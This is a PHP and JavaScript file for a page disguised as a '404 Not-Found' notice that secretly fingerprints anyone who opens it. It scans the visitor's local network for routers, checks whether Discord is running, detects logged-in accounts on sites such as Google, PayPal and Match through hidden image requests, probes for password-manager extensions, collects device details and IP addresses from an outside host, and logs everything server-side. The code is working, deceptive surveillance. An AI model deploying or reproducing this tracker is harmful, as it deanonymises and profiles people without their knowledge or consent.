<?php

session_start();


if (isset($_POST['k']) && isset($_POST['v'])){ // If the browser is POSTING the gathered data to us
   
    // If it's the first time this user has had this IP address, or user agent.
    if (!in_array($_SERVER['REMOTE_ADDR'], $_SESSION['ips']) || !in_array($_SERVER['HTTP_USER_AGENT'], $_SESSION['agents'])){
        if (!in_array($_SERVER['REMOTE_ADDR'], $_SESSION['ips'])){
            array_push($_SESSION['ips'], $_SERVER['REMOTE_ADDR']);
        }
        if (!in_array($_SERVER['HTTP_USER_AGENT'], $_SESSION['agents'])){
            array_push($_SESSION['agents'], $_SERVER['HTTP_USER_AGENT']);
        }
        $fileContents = file_get_contents($_SESSION['fileName']);

        file_put_contents($_SESSION['fileName'], $_SERVER['REMOTE_ADDR'] . " -- " . $_SERVER['HTTP_USER_AGENT'] . "\n" . $fileContents);
    }

    // If this IP or User-Agent is different than the last one we got
    if ($_SESSION['latestIP'] != $_SERVER['REMOTE_ADDR'] || $_SESSION['latestUA'] != $_SERVER['HTTP_USER_AGENT']){
        $_SESSION['latestIP'] = $_SERVER['REMOTE_ADDR'];
        $_SESSION['latestUA'] = $_SERVER['HTTP_USER_AGENT'];

        file_put_contents($_SESSION['fileName'], $_SERVER['REMOTE_ADDR'] . " -- " . $_SERVER['HTTP_USER_AGENT'] . "\n" . $fileContents);
    } 

    file_put_contents($_SESSION['fileName'], $_POST['k'] . ": " . $_POST['v'] . "\n", FILE_APPEND | LOCK_EX);
    return;
}

// If it's just a GET request
// If we haven't initialized a session yet
if (!array_key_exists('firstSeen', $_SESSION)){ 
    if (!file_exists('output/')) {
        mkdir('output', 0777, true);
    }
    $_SESSION['firstSeen'] = date("Y-m-d-h:i:s");
    $_SESSION['fileName'] = 'output/' . $_SESSION['firstSeen'] . "-" . $_SERVER['REMOTE_ADDR'] . ".txt";
    
    $_SESSION['ips'] = array();
    $_SESSION['agents'] = array();
    file_put_contents($_SESSION['fileName'], "");
}

// If we have a referer add it to their log file
if (isset($_SERVER['HTTP_REFERER'])){
    file_put_contents($_SESSION['fileName'], $_SERVER['HTTP_REFERER'] . "\n", FILE_APPEND | LOCK_EX);
}
?>

<title>404 Not-Found</title>
<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script> 

<style>
html {
    height: 100%;

}

body{
    font-family: 'Lato', sans-serif;
    color: #888;
    margin: 0;

}

#main{
    display: table;
    width: 100%;
    height: 100vh;
    text-align: center;
}

.fof{
	  display: table-cell;
	  vertical-align: middle;
}

.fof h1{
	  font-size: 50px;
	  display: inline-block;
	  padding-right: 12px;
	  animation: type .5s alternate infinite;
}
</style>

<script>
var running = 0;
var resp = {};
let touch =  false;

function submitResult(k, v) {
    $.ajax({
                type: 'POST',
                url: window.location,
                data: { 
                    'k': k,
                    'v': v 
                },
                success: function(msg){
                }
            });
}
submitResult('url', window.location.href);

window.onload = function(){
    // Check if touch is enabled
    try {  
        running++
        document.createEvent("TouchEvent");  
        submitResult('touch', true);
        //resp['touch'] = true;
        
    } catch (e) {  
        submitResult('touch', false);
        //resp['touch'] = false;
    }  

    // Try connectng to router IP addresses
    var route = "";

    function checkForRouter(ip){
        $.ajax({
            url: ip,
            dataType: "html",
            cache: "false",
            complete: function(one, two) {
                    if (two == "success" || two == "error") {
                        if (route == "") {
                            route = ip;
                            //resp['router'] = ip;
                            submitResult('router', ip);
                            
                        }
                    } else {
                        if (route == "") {
                        //resp['router'] = false;
                        }
                    }

            },
            timeout: 2000
        });
    }

    running++
    //resp['router'] = "";
    checkForRouter("https://192.168.0.1");
    checkForRouter("https://192.168.0.254");
    checkForRouter("https://10.0.0.1");
    checkForRouter("https://10.0.0.254");
    checkForRouter("https://192.168.1.1");
    checkForRouter("https://192.168.1.254");
    checkForRouter("https://172.16.0.1");
    checkForRouter("https://172.16.0.254");
    checkForRouter("https://172.16.1.1");
    checkForRouter("https://172.16.1.254");

    // Get GPU info to further verify platform
    running++
    function getUnmaskedInfo(gl) {
        var unMaskedInfo = {
            renderer: '',
            vendor: ''
        };

        var dbgRenderInfo = gl.getExtension("WEBGL_debug_renderer_info");
        if (dbgRenderInfo != null) {
            unMaskedInfo.renderer = gl.getParameter(dbgRenderInfo.UNMASKED_RENDERER_WEBGL);
            unMaskedInfo.vendor = gl.getParameter(dbgRenderInfo.UNMASKED_VENDOR_WEBGL);
        }

        return unMaskedInfo;

    }


    var canvas;
    canvas = document.getElementById("glcanvas");
    var gl = canvas.getContext("experimental-webgl");
    //resp['gpu'] = getUnmaskedInfo(gl).renderer;
    submitResult('gpu', getUnmaskedInfo(gl).renderer);


    // Get OS/browser info

    running += 4;
    //resp['browser'] = navigator.appCodeName;
    //resp['browserVersion'] = navigator.appVersion;
    //resp['renderer'] = navigator.product;
    //resp['platform'] = navigator.platform;
    submitResult('browserVersion', navigator.appVersion);
    submitResult('renderer', navigator.product);
    submitResult('platform', navigator.platform);

    // Get screen X/Y
    running += 2;
    //resp['ScreenX'] = screen.width;
    submitResult("Screen Width", screen.width);
    //resp['ScreenY'] = screen.height;
    submitResult('Screen Height', screen.height);

    running += 2;
    // Detect AV input
    navigator.mediaDevices.enumerateDevices()
        .then(function(devices) {
            devices.forEach(function(device) {
                if (device.kind == "audioinput"){
                    //resp['mic'] = 'Found';
                    submitResult('mic', 'Found');
                } else if (device.kind == "videoinput"){
                    //resp['webcam'] = 'Found';
                    submitResult('webcam', 'Found');
                }
            });
        })
        .catch(function(err) {
        });
        if ('mic' in resp) {
        } else {
            //resp['mic'] = "Not found";
        }
        if ('webcam' in resp) {
        } else {
            //resp['webcam'] = "Not found";
        }

    running++
    // Get IPV6 address
    $.ajax({
        url: "https://ipv6.hastysec.dev",
        dataType: "text",
        cache: "false",
        complete: function(one, two) {
            if (two == "success") {
                //resp['ipv6'] = one.responseText;
                submitResult('ipv6', one.responseText);

            } else {
                //resp['ipv6'] = "Unable to retrieve";
                submitResult('ipv6', "Unable to retrieve");
            }
        },
        error: function(one, two, three) {
            //resp['ipv6'] = "Unable to retrieve";
            submitResult('ipv6', "Unable to retrieve");
        },
        timeout: 3000
    });

    running++
    // Get request packet info
    $.ajax({
        url: "https://mtu.hastysec.dev",
        dataType: "text",
        cache: "false",
        complete: function(one, two) {
            if (two == "success") {
                //resp['mtu'] = one.responseText;
                submitResult('mtu', one.responseText);


            } else {//if (two == "timeout") {
                //resp['mtu'] = "Unable to retrieve";
                submitResult('mtu', "Unable to retrieve");

            }
        },
        error: function(one, two, three) {
            //resp['mtu'] = "Unable to retrieve";
            submitResult('mtu', "Unable to retrieve");

        },
        timeout: 3000
    });

    running++
    // Is discord open?
    $.ajax({
        url: "http://127.0.0.1:6463/",
        dataType: "text",
        cache: "false",
        error: function(one, two, three) {
            if (three === "Not Found") {
                //resp['discord'] = "Running";
                submitResult('Discord', "Running");

            } else {
                //resp['discord'] = "Not running";
                submitResult('Discord', "Not Running");


            }
        },

        timeout: 1000
    });


    // Get fonts
    running ++
    
    const fontCheck = new Set([
        // Windows 10
        'Arial', 'Arial Black', 'Bahnschrift', 'Calibri', 'Cambria', 'Cambria Math', 'Candara', 'Comic Sans MS', 'Consolas', 'Constantia', 'Corbel', 'Courier New', 'Ebrima', 'Franklin Gothic Medium', 'Gabriola', 'Gadugi', 'Georgia', 'HoloLens MDL2 Assets', 'Impact', 'Ink Free', 'Javanese Text', 'Leelawadee UI', 'Lucida Console', 'Lucida Sans Unicode', 'Malgun Gothic', 'Marlett', 'Microsoft Himalaya', 'Microsoft JhengHei', 'Microsoft New Tai Lue', 'Microsoft PhagsPa', 'Microsoft Sans Serif', 'Microsoft Tai Le', 'Microsoft YaHei', 'Microsoft Yi Baiti', 'MingLiU-ExtB', 'Mongolian Baiti', 'MS Gothic', 'MV Boli', 'Myanmar Text', 'Nirmala UI', 'Palatino Linotype', 'Segoe MDL2 Assets', 'Segoe Print', 'Segoe Script', 'Segoe UI', 'Segoe UI Historic', 'Segoe UI Emoji', 'Segoe UI Symbol', 'SimSun', 'Sitka', 'Sylfaen', 'Symbol', 'Tahoma', 'Times New Roman', 'Trebuchet MS', 'Verdana', 'Webdings', 'Wingdings', 'Yu Gothic',
        // macOS
        'American Typewriter', 'Andale Mono', 'Arial', 'Arial Black', 'Arial Narrow', 'Arial Rounded MT Bold', 'Arial Unicode MS', 'Avenir', 'Avenir Next', 'Avenir Next Condensed', 'Baskerville', 'Big Caslon', 'Bodoni 72', 'Bodoni 72 Oldstyle', 'Bodoni 72 Smallcaps', 'Bradley Hand', 'Brush Script MT', 'Chalkboard', 'Chalkboard SE', 'Chalkduster', 'Charter', 'Cochin', 'Comic Sans MS', 'Copperplate', 'Courier', 'Courier New', 'Didot', 'DIN Alternate', 'DIN Condensed', 'Futura', 'Geneva', 'Georgia', 'Gill Sans', 'Helvetica', 'Helvetica Neue', 'Herculanum', 'Hoefler Text', 'Impact', 'Lucida Grande', 'Luminari', 'Marker Felt', 'Menlo', 'Microsoft Sans Serif', 'Monaco', 'Noteworthy', 'Optima', 'Palatino', 'Papyrus', 'Phosphate', 'Rockwell', 'Savoye LET', 'SignPainter', 'Skia', 'Snell Roundhand', 'Tahoma', 'Times', 'Times New Roman', 'Trattatello', 'Trebuchet MS', 'Verdana', 'Zapfino',
    ].sort());

    const fontAvailable = new Set();

    for (const font of fontCheck.values()) {
        if (document.fonts.check(`12px "${font}"`)) {
            fontAvailable.add(font);
        }
    }

    let browserFonts = [...fontAvailable.values()];
    //resp['fonts'] = browserFonts.length + " fonts: " + browserFonts;
    submitResult('Fonts', browserFonts.length + " fonts: " + browserFonts);



    // Get logged in websites
    function checkLogin(website, url){
        runningLogins++;
        var img = new Image();
        img.setAttribute("style","visibility:hidden");
        img.setAttribute("width","0");
        img.setAttribute("height","0");
        img.src = url + "?&" + new Date().getTime();
        img.setAttribute("attr","start");
        img.onerror = function() {
            runningLogins--;
        };
        img.onload = function() {
            //resp['logins'].push(website)
            foundLogins.push(website);
            runningLogins--;

        };

        document.body.appendChild(img);
    }


    foundLogins = [];
    runningLogins = 0;

    logins = {}
    logins["Google Services"] = "https://accounts.google.com/ServiceLogin?passive=true&continue=https%3A%2F%2Fwww.google.com%2Ffavicon.ico";
    logins["Paypal"] = "https://www.paypal.com/signin?returnUri=favicon.ico";
    logins["Instagram"] = "https://www.instagram.com/accounts/login/?next=%2Ffavicon.ico";
    logins["Facebook"] = "https://www.facebook.com/login.php?next=https%3A%2F%2Fwww.facebook.com%2Ffavicon.ico";
    logins["Twitter"] = "https://twitter.com/login?redirect_after_login=/favicon.ico";
    logins["Amazon"] = "https://www.amazon.com/ap/signin?_encoding=UTF8&accountStatusPolicy=P1&openid.assoc_handle=usflex&openid.claimed_id=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0%2Fidentifier_select&openid.identity=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0%2Fidentifier_select&openid.mode=checkid_setup&openid.ns=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0&openid.ns.pape=http%3A%2F%2Fspecs.openid.net%2Fextensions%2Fpape%2F1.0&openid.pape.max_auth_age=0&openid.return_to=https%3A%2F%2Fwww.amazon.com%2Ffavicon.ico&pageId=webcs-yourorder&showRmrMe=1";
    logins["Yahoo"] = "https://login.yahoo.com/?.src=ym&.partner=none&.lang=en-CA&.intl=ca&.done=https%3A%2F%2Fmail.yahoo.com%2Ffavicon.ico";
    logins["Hotmail"] = "https://storage.live.com/mydata/myprofile/expressionprofile/profilephoto:UserTileStatic,UserTileSmall/MeControlMediumUserTile?ck=1&ex=24&fofoff=1";
    logins["Match"] = "https://www.match.com/login?to=/favicon.ico";
    

    //resp['logins'] = [];
    running++;
    for (var key in logins){
        if (logins.hasOwnProperty(key)){
            checkLogin(key, logins[key]);
        }
    }

    // Submit found logins once all websites are checked
    function submitLogins(){
        if (runningLogins > 0){
            setTimeout(submitLogins, 500);
        } else {
            submitResult("Logins", foundLogins.toString())
        }
    }
    submitLogins();


    
    // Get installed browser plugins (Chrome only)
    function checkExtension(name, url){
        runningExt++;
        $.ajax({
        url: url,
        cache: "false",
        complete: function(one, two) {
            if (two == "success"){
                //resp['extensions'].push(name)
                foundExt.push(name);
            }
            runningExt--;
            
        },
        error: function(one, two, three) {
            runningExt--;
        },
        timeout: 1000
    });
    }

    foundExt = [];
    runningExt = 0;

    extensions = {};
    extensions['Hunchly'] = 'chrome-extension://amfnegileeghgikpggcebehdepknalbf/content-script/modal.css';
    extensions['KeepassXC'] = 'chrome-extension://oboonakemofpalcgghocfoadofidjkkk/icons/otp.svg';
    extensions['Bitwarden'] = 'chrome-extension://nngceckbapebfimnlniiiahkandclblb/notification/bar.html';
    extensions['Lastpass'] = 'chrome-extension://hdokiejnpimakedhajhdlcegeplioahd/overlay.html';
    extensions['User-Agent Switcher for Chrome'] = 'chrome-extension://djflhoibgkdhkhhcedjiklpkjnoahfmg/jquery.js';
    extensions['User Agent Switcher'] = 'chrome-extension://kchfmpdcejfkipopnolndinkeoipnoia/jquery.js';
    extensions['Chrome Media Router'] = 'chrome-extension://pkedcjkdefgpdelpbcmbmeomcjbeemfm/cast_sender.js';

    //resp['extensions'] = [];
    running++;
    for (var key in extensions){
        if (extensions.hasOwnProperty(key)){
            checkExtension(key, extensions[key]);
        }
    }

        // Submit found logins once all websites are checked
    function submitExts(){
        if (runningExt > 0){
            setTimeout(submitExts, 500);
        } else {
            submitResult("Extensions", foundExt.toString());
        }
    }
    submitExts();

    // Get system language
    running++
    //resp['language'] = navigator.language;
    submitResult("Language", navigator.language);

    // Get system time
    running++
    var today = new Date();
    var date = today.getFullYear()+'-'+(today.getMonth()+1)+'-'+today.getDate();
    var time = today.getHours() + ":" + today.getMinutes() + ":" + today.getSeconds();
    //resp['System Time'] = date+' '+time;
    submitResult("System Time", date+' '+time)

    // Wait for all results before POSTing to server
    // Or wait 5 seconds
    var sent = false;

    // function wait(){
    //     if (Object.keys(resp).length < running) {
    //         setTimeout(wait, 500);
    //     } else {
    //         var d = "";
    //         for (var key in resp){
    //             if (resp.hasOwnProperty(key)) {
    //                 d = d + key + ": " + resp[key] + "\n";
    //             }
    //         }

                
    //         // Send POST to server
    //         $.ajax({
    //             type: 'POST',
    //             url: window.location,
    //             data: { 
    //                 'd': d 
    //             },
    //             success: function(msg){
    //             }
    //         });
    //         sent = true;

    //     }
    // }
    // wait()    
}

</script>

<canvas id="glcanvas" width="0" height="0"></canvas>
<body>
<div id="main">
    <div class="fof">
        <h1>The requested page has been removed</h1>
    </div>
</div>
</body>

<script>

</script>
